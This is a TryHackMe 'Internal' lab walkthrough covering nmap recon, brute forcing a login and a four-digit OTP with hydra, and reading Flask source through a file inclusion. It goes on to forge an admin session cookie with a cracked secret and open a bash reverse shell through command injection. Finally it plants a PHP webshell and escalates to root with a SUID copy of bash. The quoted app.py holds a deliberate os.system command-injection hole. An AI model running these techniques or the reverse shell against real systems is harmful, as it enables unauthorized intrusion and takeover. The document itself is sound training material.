---
title: 'THM | Internal'
published: 2026-01-16
draft: false
description: 'THM Room `Internal` writeup.'
tags: ['TryHackMe', 'linux']
---

## Recon
### Initial Scanning

`Nmap` found 6 open TCP ports, running:
- `echo` - It is a **very old** debugging service, used in legacy systems (or misconfigured ones). It just `echoes` back whatever data is sent.
- `ftp` - No `anonymous` login available.
- `telnet` - Another old remote login protocol that sends data (including passwords) in plain text, so it’s insecure and mostly replaced by SSH except on legacy devices.
- `ssh`
- `http @80` - Static site with `Apache` server.
- `http @8080` - `Flask` app for `internal portal - **Intranet**` . Redirected to `/login`

```text
# Nmap 7.94SVN scan initiated Wed Jan 14 18:03:57 2026 as: nmap -sC -sV -p7,21,22,23,80,8080 -Pn -n -vv -oN nmap/tcp_deep 10.49.189.242
Nmap scan report for 10.49.189.242
Host is up, received user-set (0.031s latency).
Scanned at 2026-01-14 18:03:58 EST for 109s

PORT     STATE SERVICE    REASON         VERSION
7/tcp    open  echo       syn-ack ttl 62
21/tcp   open  ftp        syn-ack ttl 62 vsftpd 3.0.5
22/tcp   open  ssh        syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:12:1b:01:4b:0b:58:a8:88:a3:b2:3c:d1:32:91:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSQSKl1SzUaJXve3IYXqqQTTaij2RKqs3atMaAvkTf3KEHUjyuGJGwZKx4gZ3bgdR3dElgHlTPq4XNutD7xTNo1pxEd8mAmvlht2+4/6ka0LuIZAdY8AbB+CZJtR9U43K4zvsegU59i6t4aClp/iXEkJL7TdhkPuD3pH1H+YaImu87vSCICD/EM2+aGX45wlKkMwMFpxDUE0ioCsrHCcvXm2nMgUtgMsq90//rrRxC1keDE/wQwvwfP/3ojUN4jdiK59N5xCAimTQM0LIKZLprX9rDEAHukK4PwseDzjZJNGvG6xw0h2iqxTfdIo2Aqtka+bgp9c+nLovEVN25V0qDXAkKyibGj1rfHlNeS/xZX8VSOIDtKErq7Ab1XRaqLgcCZoVnKWWYQ+ZAfEW/P/NZX9jdoggSjgQArebA2m9YQUw5HQmXqO/P9Z6UUKTMuxSLwdKi1denLxdr855xAXTiGLyRelJ+0IoKryGdPdsyG1a2fsg866gZ5XefW1xh2DM=
|   256 d7:3e:4f:06:b2:69:f4:d4:fa:3b:8e:6a:28:d5:24:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG+erjXSKpv64LtVzIad5fyRz0bTslTcdHePtbDt5ArEsDDbsPPxYG0QX1WDvIhEHBq4ST9fZd6e/phdchKDhU8=
|   256 33:7f:e3:3e:d3:1c:01:4f:75:a8:b5:cc:31:3b:93:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBrSu9qGQwS6Z+f7ypRg/sNN9QYXXqp3pVzztxWBXQI+
23/tcp   open  tcpwrapped syn-ack ttl 62
80/tcp   open  http       syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http-proxy syn-ack ttl 62 Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
<SNIP>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Wed, 14 Jan 2026 23:04:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
<SNIP>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 18:05:47 2026 -- 1 IP address (1 host up) scanned in 109.74 seconds
```

### Website @80
- Seems a static site with only `index.html` running out of a `Apache` server.
- fuzzing for any files or directories revealed nothing.
### Website @8080
#### Tech Stack
```http
HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 14 Jan 2026 23:04:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Connection: close
```

- `Python` web app running with `Werkzeug` server.
- Based on `404` page,  its using `Flask`.
#### Directory bruteforce
```shell
┌─[root@parrot]─[~/Labs/TryHackMe/Intranet]
└──╼ [★]$ cat dirbust/root\:8080-directories.ffuf | jq .results[].input.FUZZ 
"admin"
"home"
"logout"
"login"
"internal"
"application"
"external"
"sms"
"temporary"
```

- Every `uri` required to be logged in other than `/login`
---
## Exploitation
### Login page
- Since there is no other functionality to play with, I started with testing the login page against basic payloads. (`SQL, NoSQL or XPATH`).
- The `login request` tells if the `email` is valid or not.
- Everything else seems fine other than the fact that **rate limiting is not enabled**, which is a sign that the password can be bruteforced.
#### Comments
- The comments on the login page revealed two usernames : `anders` & `devops`,  checking their emails against the page shows these are valid :
	- `anders@securesolacomputers.no`
	- `devops@securesolacomputers.no`
- All I needed is a `password` now to get in.
#### Bruteforcing password
- My initial attempts to bruteforce passwords for either of the users using common wordlists achieved no results.
- Next, I tried generating a custom wordlist. I used `cewl` to gather `interesting` words from the website.
```shell
$ cewl http://10.49.189.242:8080/ -d 4 -m 6 -w custom_password.list
```
- Then, I used this wordlist with different `hashcat` rules to generate a new list of passwords, with common `hashcat` rules.
```shell
$  hashcat --force custom_password.list -r best64.rule --stdout
```
- Still nothing. I was stuck here for a while. 
- Then, I used `chatgpt` to generate  a new `rule` that will generate passwords like the `coporate_passwords` wordlist from `SecLists`.
```text
:
c
u
l
T0
T1
$1
$2
$3
$!
$@
$#
$.
$?
$2024
$2025
$2026
c$1
c$12
c$123
c$1234
c$!
c$@123
c$2025
T0$1
T0$12
T0$123
T0$!
T0$2025
```
- I added some more years (from 2020), and generated a new wordlist and started with bruteforcing. One of the passwords worked.
#### Bruteforce `2FA` code at `/sms` 
- After logging in, there was another form that required an `OTP` (*a 4 digit otp, indicated by the placeholder*).
- As again, there was **no rate limit** implemented here again. So, I started with another bruteforce attack.
- I generally, use `ffuf` as its simpler, but I wanted to give `hydra` a try.
```shell
$ hydra -L <(seq -w 1 999) -s 10.49.189.242 8080 http-form-post "/sms:sms=^USER^:Invalid SMS" -I -V -F -o sms.txt
```
- As expected, this worked and returned an `OTP` to log in.
---
## Recon - Internal Website after autenticated
- After logging in, I had access to these pages:
	- `/home`
	- `/internal`
	- `/external`
- The `/admin` , `/temporary` and  `/applicartion` pages were still blocked.
### `JWT` token
- The site assigned a `jwt` token generated by `Flask`, with the value:
```json
{
	"username":"<user>",
	"logged_in":true
}
```
- Since, all the success I had in this room is by *bruteforcing*, I decided to crack this `jwt's` secret by another bruteforce attack.
- `Hashcat` does not work with `Flask generated JWT's` so I used `flask-unsign` tool to perform the attack, with the `rockyou.txt` wordlist.
### Get Internal News
- Other than the `jwt`, only interesting thing left was **fetching the internal news**.
- The `fetch request` used the keyword `latest` to fetch the news.
---
## Exploiting LFI 

It took me longer to realise that I was dealing with a **FIle Inclusion** vulnerability.
- I started with basic injections, every request returned with a **5XX** error.
- Next, after simply replacing the `latest` keyword with any garbage value or with `LATEST`, it still returned **5XX** errors.
- This was an indication. 
- The fact that the server returned a **5XX** error instead of a **4XX** error, it means that the server was trying to access something using the given keyword, and if it wasn't there, the server didn't knew how to handle it - **Classic LFI**.
- It took me a little fuzzing before I landed on a payload - `./latest`, which returned a **200** response.
- At this point, it was clear its a LFI.
### Analysing source code
- I started with requesting `/proc/self/cmdline` and `/proc/slef/environ` files, which revealed the python app was running as the user `devops`.
- I looked for some ssh keys for any user on the room : `anders` , `devops` or `ubuntu`. Didn't found anything.
- Finally, I retrieved `app.py` from the `devops`'s user's home directory, and started analysing it.

```python
# app.py
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string, send_file
from time import gmtime, strftime
import jinja2, os, hashlib, random

app = Flask(__name__, template_folder="/home/devops/templates")

###############################################
# Flag: THM{} #
###############################################

key = "secret_key_" + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

def check_hacking_attempt(value):
#<SNIP>
@app.route("/", methods=["GET"])
def root():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                return redirect("/home")
#<SNIP>
@app.route("/login", methods=["GET", "POST"])
def login():

        if session.get("logged_in"):
                return redirect("/home")

        if request.method == "POST":

                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("login.html", error=error)

                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("login.html", error=error)


                if username.lower() == "admin@securesolacoders.no":
                        error = "Invalid password"
                        return render_template("login.html", error=error)


                if username.lower() == "devops@securesolacoders.no":
                        error = "Invalid password"
                        return render_template("login.html", error=error)


                if username.lower() == "anders@securesolacoders.no":
                        if password == "securesolacoders2022":
                                session["username"] = "anders"

                                global sms_code
                                sms_code = random.randrange(1000,9999)

                                return redirect("/sms")
                        
                        else:
                                error = "Invalid password"
                                return render_template("login.html", error=error)
                else:
                        error = "Invalid username"
                        return render_template("login.html", error=error)

        return render_template("login.html")

@app.route("/sms", methods=["GET", "POST"])
def sms():
#<SNIP>

@app.route("/logout", methods=["GET"])
def logout():
#<SNIP>

@app.route("/home", methods=["GET"])
def home():
#<SNIP>

@app.route("/admin", methods=["GET", "POST"])
def admin():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                if session.get("username") == "admin":

                        if request.method == "POST":
                                os.system(request.form["debug"])
                                return render_template("admin.html")

                        current_ip = request.remote_addr
                        current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())

                        return render_template("admin.html", current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)

@app.route("/internal", methods=["GET", "POST"])
def internal():
#<SNIP>

@app.route("/external", methods=["GET"])
def external():
#SNIP

if __name__ == "__main__":
        app.run(host="0.0.0.0", port=8080, debug=False)
```

A couple of things were poitned out :
1. All the routes I bruteforced were just rabbit holes.
2. There was no possbile way to login as `admin`.
3. The secret key used for `jwt` was very weak, **easy to bruteforce**, only 900000 combinations.
4. The admin had access to a functionality which was clearly an **OS Command Injection**.

### Cracking JWT token
- With python I generated a wordlist in seconds.
- ```python
  with open('secrets.txt','w') as f:
    for i in range(100000,999999):
        f.write(f"secret_key_{i}\n")
  ```

- Then, I used `flask-unsign` again to bruteforce the key. 
- With the key in hand, I forged a new **JWT token**, this time with `username as admin`.
- ```shell
  $ flask-unsign --sign --secret '<secret>' -c '{"logged_in":True,"username":"admin"}' | copy
  ```

- Now, with this new token, I logged in as `admin` and had access to the `/admin` page.
---
## Exploiting OS Command Injection

I used the **OG Bash Reverse Shell paylaod** to get me a shell as `devops`.
```shell
$ bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
---
## Lateral Movement : `devops` --> `anders`

- I manually do some recon after I gain a shell before running scripts like `linpeas` or `linenum`.
- I checked `SUID` & `GUID` binaries, `sudoers` list, running services, configs (`ftp` , `telnet` etc).
- Found a `SUID` binary named `telnetlogin` , which was new to me, but I didn't had access to execute it.
- Next, I checked running processes, and it showed that the `Apache` web app running on port 80 was running as the user `anders`.
- The `/var/www/html` directory was `writable` by everyone, so I placed a `php webshell` in the directory and accessed it, I was able to get a shell as `anders`.
---
## Privilege Escalation: `anders` --> `root`

- The user `anders` had access to the binary `system.service`  as `root`  to restart `apache` service.
- The thing to note here is that the `apache` service won't be running as `root`.
- I started looking for config files in the `/etc/apache2/` directory and found the only file `envvars` that I had access to modify.
- In Apache2 (especially on Debian/Ubuntu), the **`envvars`** file is used to **set environment variables that control how the Apache process starts and runs**.
- Its a bash script file that sets variables for the `apache2` service : 
	- `APACHE_RUN_USER`
	- `APACHE_RUN_GROUP`
- I changed the `APACHE_RUN_USER` to `root` which was previously set to `anders`, and hoped the service would now run as `root`. It didn't. The service wasn't restarting.
- Next, I tried `APACHE_RUN_GROUP` variable to root, and it was working, I checked in my previous web shell, I was now a part of group `root`. It didn't helped me gain anything more.
- Finally, to escalate to `root` , I did the simple, copied the `bash` bin and changed its permissions to **`4755` (SUID)**.
- Still when I tried to copy the bin in the `/tmp` dir, it didn't worked.
- I copied it in the system root, and after executing it, I had access as `root`.